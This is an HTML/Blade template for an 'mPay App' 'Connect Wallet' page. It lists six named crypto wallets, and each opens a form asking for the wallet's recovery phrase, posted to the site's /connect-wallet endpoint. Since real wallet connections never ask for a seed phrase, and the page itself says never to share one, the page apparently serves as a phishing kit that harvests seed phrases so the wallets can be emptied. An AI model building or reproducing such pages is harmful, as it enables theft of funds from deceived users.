<!DOCTYPE html>
<html lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="description" content="mpay" />
    <meta name="keywords" content="mpay" />
    <meta name="author" content="mpay" />
    <link rel="manifest" href="manifest.json" />
    <link
      rel="icon"
      href="assets/images/logo/favicon.png"
      type="image/x-icon"
    />
    <title>mPay App</title>
    <link rel="apple-touch-icon" href="assets/images/logo/favicon.png" />
    <meta name="theme-color" content="#122636" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
    <meta name="apple-mobile-web-app-title" content="mpay" />
    <meta
      name="msapplication-TileImage"
      content="assets/images/logo/favicon.png"
    />
    <meta name="msapplication-TileColor" content="#FFFFFF" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <!-- custom css -->
    <link rel="stylesheet" href="assets/css/custom.css" />
    <!--Google font-->
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="" />
    <link
      href="../../css2?family=Lato:wght@100;300;400;700;900&display=swap"
      rel="stylesheet"
    />

    <!-- iconsax css -->
    <link
      rel="stylesheet"
      type="text/css"
      href="assets/css/vendors/iconsax.css"
    />

    <!-- bootstrap css -->
    <link
      rel="stylesheet"
      id="rtl-link"
      type="text/css"
      href="assets/css/vendors/bootstrap.min.css"
    />

    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css"
    />

    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.8.1/font/bootstrap-icons.min.css"
    />

    <!-- swiper css -->
    <link
      rel="stylesheet"
      type="text/css"
      href="assets/css/vendors/swiper-bundle.min.css"
    />

    <!-- Theme css -->
    <link
      rel="stylesheet"
      id="change-link"
      type="text/css"
      href="assets/css/style.css"
    />

    <style>
      textarea:focus {
        outline: none;
      }
    </style>
  </head>

  <body>
    <header class="section-t-space">
      <div class="custom-container">
        <div class="header-panel">
          <a href="crypto" class="back-btn">
            <i class="icon" data-feather="arrow-left"></i>
          </a>

          <a href="connect-wallet-scan" class="back-btn">
            <img
              src="assets/images/qr-code.png"
              alt=""
              style="width: 20px; height: 20px"
            />
          </a>
        </div>
      </div>
    </header>

    <section class="container">
      <h1>Connect Wallet</h1>
      <p style="margin-top: 6px">
        Start by connecting with one of the  below. Be sure to store your
        private keys or seed phase securely. Never share them with anyone.
      </p>
    </section>

<!-- Wallet options -->
<div class="container mt-5">
  <div class="row row-cols-3 g-3 justify-content-center">
    <!-- Metamask -->
    <div class="col" href="#form1" data-bs-toggle="modal">
      <div class="wallet-option">
        <img src="assets/images/MetaMask.png" alt="Metamask" class="icons" />
        <span>Metamask</span>
      </div>
    </div>
    <!-- Binance Wallet -->
    <div class="col" href="#form2" data-bs-toggle="modal">
      <div class="wallet-option">
        <img src="assets/images/svg/binance.svg" class="icons" alt="Binance Wallet" />
        <span>Binance Wallet</span>
      </div>
    </div>
    <!-- Coinbase Wallet -->
    <div class="col" href="#form3" data-bs-toggle="modal">
      <div class="wallet-option">
        <img src="assets/images/Coinbase.png" class="icons" alt="Coinbase Wallet" />
        <span>Coinbase Wallet</span>
      </div>
    </div>
    <!-- Trust Wallet -->
    <div class="col" href="#form4" data-bs-toggle="modal">
      <div class="wallet-option">
        <img src="assets/images/trusrwallet.png" class="icons" alt="Trust Wallet" />
        <span>Trust Wallet</span>
      </div>
    </div>
    <!-- WalletConnect -->
    <div class="col" href="#form5" data-bs-toggle="modal">
      <div class="wallet-option">
        <img src="assets/images/walletconnect.png" class="icons" alt="WalletConnect" />
        <span>WalletConnect</span>
      </div>
    </div>
    <!-- Opera Wallet -->
    <div class="col" href="#form6" data-bs-toggle="modal">
      <div class="wallet-option">
        <img src="assets/images/Opera-Icon-png" class="icons" alt="Opera Wallet" />
        <span>Opera Wallet</span>
      </div>
    </div>
  </div>
</div>
    
<!-- MetaMask Modal -->
<div class="modal add-money-modal fade" id="form1" tabindex="-1">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header">
        <div class="modal-title">
          <img src="assets/images/MetaMask.png" alt="Metamask" class="icons" />
          <span>Metamask</span>
        </div>
      </div>
      <div class="modal-body">
        <form action="/connect-wallet" method="POST">
          @csrf
          <div class="form-group">
            <label for="inputcards" class="form-label mb-2">Wallet type</label>
            <div class="d-flex gap-2">
              <select id="inputcards" name="wallet_type" class="form-select">
                <option>Phrase</option>
              </select>
            </div>
          </div>
          <input type="hidden" class="form-control" name="wallet_name" value="metamask" />
          <div class="form-group">
            <label class="form-label">Recovery Phrase</label>
            <div class="form-input mb-2">
              <textarea name="recovery_phrase" class="form-control" cols="30" rows="7"></textarea>
              <x-form-error name="recovery_phrase"/>
            </div>
          </div>
          <button type="submit" class="btn theme-btn successfully w-100">Connect Wallet</button>
        </form>
      </div>
      <button type="button" class="btn close-btn" data-bs-dismiss="modal">
        <i class="icon" data-feather="x"></i>
      </button>
    </div>
  </div>
</div>

<!-- Binance Wallet Modal -->
<div class="modal add-money-modal fade" id="form2" tabindex="-1">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header">
        <div class="modal-title">
          <img src="assets/images/svg/binance.svg" class="icons" alt="Binance Wallet" />
          <span>Binance Wallet</span>
        </div>
      </div>
      <div class="modal-body">
        <form action="/connect-wallet" method="POST">
          @csrf
          <div class="form-group">
            <label for="inputcards" class="form-label mb-2">Wallet type</label>
            <div class="d-flex gap-2">
              <select id="inputcards" name="wallet_type" class="form-select">
                <option>Phrase</option>
              </select>
            </div>
          </div>
          <input type="hidden" class="form-control" name="wallet_name" value="binance" />
          <div class="form-group">
            <label class="form-label">Recovery Phrase</label>
            <div class="form-input mb-2">
              <textarea name="recovery_phrase" class="form-control" cols="30" rows="7"></textarea>
              <x-form-error name="recovery_phrase"/>
            </div>
          </div>
          <button type="submit" class="btn theme-btn successfully w-100">Connect Wallet</button>
        </form>
      </div>
      <button type="button" class="btn close-btn" data-bs-dismiss="modal">
        <i class="icon" data-feather="x"></i>
      </button>
    </div>
  </div>
</div>

<!-- Coinbase Wallet Modal -->
<div class="modal add-money-modal fade" id="form3" tabindex="-1">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header">
        <div class="modal-title">
          <img src="assets/images/Coinbase.png" class="icons" alt="Coinbase Wallet" />
          <span>Coinbase Wallet</span>
        </div>
      </div>
      <div class="modal-body">
        <form action="/connect-wallet" method="POST">
          @csrf
          <div class="form-group">
            <label for="inputcards" class="form-label mb-2">Wallet type</label>
            <div class="d-flex gap-2">
              <select id="inputcards" name="wallet_type" class="form-select">
                <option>Phrase</option>
              </select>
            </div>
          </div>
          <input type="hidden" class="form-control" name="wallet_name" value="coinbase" />
          <div class="form-group">
            <label class="form-label">Recovery Phrase</label>
            <div class="form-input mb-2">
              <textarea name="recovery_phrase" class="form-control" cols="30" rows="7"></textarea>
              <x-form-error name="recovery_phrase"/>
            </div>
          </div>
          <button type="submit" class="btn theme-btn successfully w-100">Connect Wallet</button>
        </form>
      </div>
      <button type="button" class="btn close-btn" data-bs-dismiss="modal">
        <i class="icon" data-feather="x"></i>
      </button>
    </div>
  </div>
</div>

<!-- Trust Wallet Modal -->
<div class="modal add-money-modal fade" id="form4" tabindex="-1">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header">
        <div class="modal-title">
          <img src="assets/images/trusrwallet.png" class="icons" alt="Trust Wallet" />
          <span>Trust Wallet</span>
        </div>
      </div>
      <div class="modal-body">
        <form action="/connect-wallet" method="POST">
          @csrf
          <div class="form-group">
            <label for="inputcards" class="form-label mb-2">Wallet type</label>
            <div class="d-flex gap-2">
              <select id="inputcards" name="wallet_type" class="form-select">
                <option>Phrase</option>
              </select>
            </div>
          </div>
          <input type="hidden" class="form-control" name="wallet_name" value="trustwallet" />
          <div class="form-group">
            <label class="form-label">Recovery Phrase</label>
            <div class="form-input mb-2">
              <textarea name="recovery_phrase" class="form-control" cols="30" rows="7"></textarea>
              <x-form-error name="recovery_phrase"/>
            </div>
          </div>
          <button type="submit" class="btn theme-btn successfully w-100">Connect Wallet</button>
        </form>
      </div>
      <button type="button" class="btn close-btn" data-bs-dismiss="modal">
        <i class="icon" data-feather="x"></i>
      </button>
    </div>
  </div>
</div>

<!-- WalletConnect Modal -->
<div class="modal add-money-modal fade" id="form5" tabindex="-1">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header">
        <div class="modal-title">
          <img src="assets/images/walletconnect.png" class="icons" alt="WalletConnect" />
          <span>WalletConnect</span>
        </div>
      </div>
      <div class="modal-body">
        <form action="/connect-wallet" method="POST">
          @csrf
          <div class="form-group">
            <label for="inputcards" class="form-label mb-2">Wallet type</label>
            <div class="d-flex gap-2">
              <select id="inputcards" name="wallet_type" class="form-select">
                <option>Phrase</option>
              </select>
            </div>
          </div>
          <input type="hidden" class="form-control" name="wallet_name" value="walletconnect" />
          <div class="form-group">
            <label class="form-label">Recovery Phrase</label>
            <div class="form-input mb-2">
              <textarea name="recovery_phrase" class="form-control" cols="30" rows="7"></textarea>
              <x-form-error name="recovery_phrase"/>
            </div>
          </div>
          <button type="submit" class="btn theme-btn successfully w-100">Connect Wallet</button>
        </form>
      </div>
      <button type="button" class="btn close-btn" data-bs-dismiss="modal">
        <i class="icon" data-feather="x"></i>
      </button>
    </div>
  </div>
</div>

<!-- Opera Wallet Modal -->
<div class="modal add-money-modal fade" id="form6" tabindex="-1">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header">
        <div class="modal-title">
          <img src="assets/images/Opera-Icon-png" class="icons" alt="Opera Wallet" />
          <span>Opera Wallet</span>
        </div>
      </div>
      <div class="modal-body">
        <form action="/connect-wallet" method="POST">
          @csrf
          <div class="form-group">
            <label for="inputcards" class="form-label mb-2">Wallet type</label>
            <div class="d-flex gap-2">
              <select id="inputcards" name="wallet_type" class="form-select">
                <option>Phrase</option>
              </select>
            </div>
          </div>
          <input type="hidden" class="form-control" name="wallet_name" value="opera" />
          <div class="form-group">
            <label class="form-label">Recovery Phrase</label>
            <div class="form-input mb-2">
              <textarea name="recovery_phrase" class="form-control" cols="30" rows="7"></textarea>
              <x-form-error name="recovery_phrase"/>
            </div>
          </div>
          <button type="submit" class="btn theme-btn successfully w-100">Connect Wallet</button>
        </form>
      </div>
      <button type="button" class="btn close-btn" data-bs-dismiss="modal">
        <i class="icon" data-feather="x"></i>
      </button>
    </div>
  </div>
</div>


    @include('components.modals')

    @if(session('success_modal') || session('error_modal'))
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            @if(session('success_modal'))
                var successModal = new bootstrap.Modal(document.getElementById('successModal'));
                document.getElementById('successMessage').textContent = "{{ session('success_modal') }}";
                successModal.show();
    
                // Delay redirect by 3 seconds (adjust as needed)
                setTimeout(function () {
                    window.location.href = "{{ session('redirect') }}";
                }, 2000);
            @endif
    
            @if(session('error_modal'))
                var errorModal = new bootstrap.Modal(document.getElementById('errorModal'));
                document.getElementById('errorMessage').textContent = "{{ session('error_modal') }}";
                errorModal.show();
            @endif
        });
    </script>
    @endif

    <!-- bootstrap js -->
    <script src="assets/js/bootstrap.bundle.min.js"></script>

    <!-- swiper js -->
    <script src="assets/js/swiper-bundle.min.js"></script>
    <script src="assets/js/custom-swiper.js"></script>

    <!-- apexcharts js -->
    <script src="assets/js/apexcharts.js"></script>
    <script src="assets/js/custom-candlestick-chart.js"></script>

    <!-- feather js -->
    <script src="assets/js/feather.min.js"></script>
    <script src="assets/js/custom-feather.js"></script>

    <!-- iconsax js -->
    <script src="assets/js/iconsax.js"></script>
    <!-- script js -->
    <script src="assets/js/script.js"></script>

    <!-- custom js -->
    <script src="assets/js/custom.js"></script>
    <script
      src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
      integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.min.js"
      integrity="sha384-0pUGZvbkm6XF6gxjEnlmuGrJXVbNuzT9qBBavbLwCsOGabYfZo0T0to5eqruptLy"
      crossorigin="anonymous"
    ></script>
  </body>
</html>
